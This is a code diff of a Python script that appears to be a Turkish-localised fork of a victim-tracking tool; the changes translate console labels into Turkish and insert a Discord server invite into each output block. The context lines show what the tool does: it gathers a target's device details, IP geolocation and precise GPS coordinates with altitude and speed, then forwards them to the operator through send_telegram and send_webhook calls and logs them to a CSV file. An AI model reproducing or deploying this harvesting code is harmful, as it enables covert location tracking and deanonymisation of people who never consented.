@@ -297,7 +297,7 @@ def data_parser():
 		var_ip = info_json['ip']
 
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
-		device_info = f'''{Y}[!] Device Information :{W}
+		device_info = f'''{Y}[!] Cihaz Bilgisi :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
 {G}[+] {C}Platform   : {W}{var_platform}
@@ -308,6 +308,8 @@ def data_parser():
 {G}[+] {C}Genişlik : {W}{var_res}
 {G}[+] {C}Tarayıcı    : {W}{var_browser}
 {G}[+] {C}Ip Adresi   : {W}{var_ip}
+Discord Sunucumuza Katılmak Için Neyi Bekliyorsun? Hadi sende katıl!
+https://discord.com/invite/kqrKeHhYSB
 '''
 		utils.print(device_info)
 		send_telegram(info_json, 'device_info')
@@ -330,7 +332,7 @@ def data_parser():
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
-				ip_info = f'''{Y}[!] IP Information :{W}
+				ip_info = f'''{Y}[!] IP Bilgisi :{W}
 
 {G}[+] {C}Kıta : {W}{var_continent}
 {G}[+] {C}Ülke   : {W}{var_country}
@@ -338,6 +340,8 @@ def data_parser():
 {G}[+] {C}Şehir      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
+Discord Sunucumuza Katılmak Için Neyi Bekliyorsun? Hadi sende katıl!
+https://discord.com/invite/kqrKeHhYSB
 '''
 				utils.print(ip_info)
 				send_telegram(data, 'ip_info')
@@ -360,7 +364,7 @@ def data_parser():
 				var_spd = result_json['spd']
 
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
-				loc_info = f'''{Y}[!] Location Information :{W}
+				loc_info = f'''{Y}[!] Konum Bilgisi :{W}
 
 {G}[+] {C}Enleme  : {W}{var_lat}
 {G}[+] {C}Boylama : {W}{var_lon}
@@ -368,11 +372,13 @@ def data_parser():
 {G}[+] {C}Genişlik  : {W}{var_alt}
 {G}[+] {C}Direktion : {W}{var_dir}
 {G}[+] {C}Hız     : {W}{var_spd}
+Discord Sunucumuza Katılmak Için Neyi Bekliyorsun? Hadi sende katıl!
+https://discord.com/invite/kqrKeHhYSB
 '''
 				utils.print(loc_info)
 				send_telegram(result_json, 'location')
 				send_webhook(result_json, 'location')
-				gmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
+				gmaps_url = f'{G}[+] {C}Google Haritalar : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
 				gmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'}
 				utils.print(gmaps_url)
 				send_telegram(gmaps_json, 'url')
@@ -409,7 +415,7 @@ def csvout(row):
 	with open(DATA_FILE, 'a') as csvfile:
 		csvwriter = writer(csvfile)
 		csvwriter.writerow(row)
-	utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
+	utils.print(f'{G}[+] {C}Bilgiler Kaydedildi! : {W}{path_to_script}/db/results.csv\n')
 
 
 def clear():
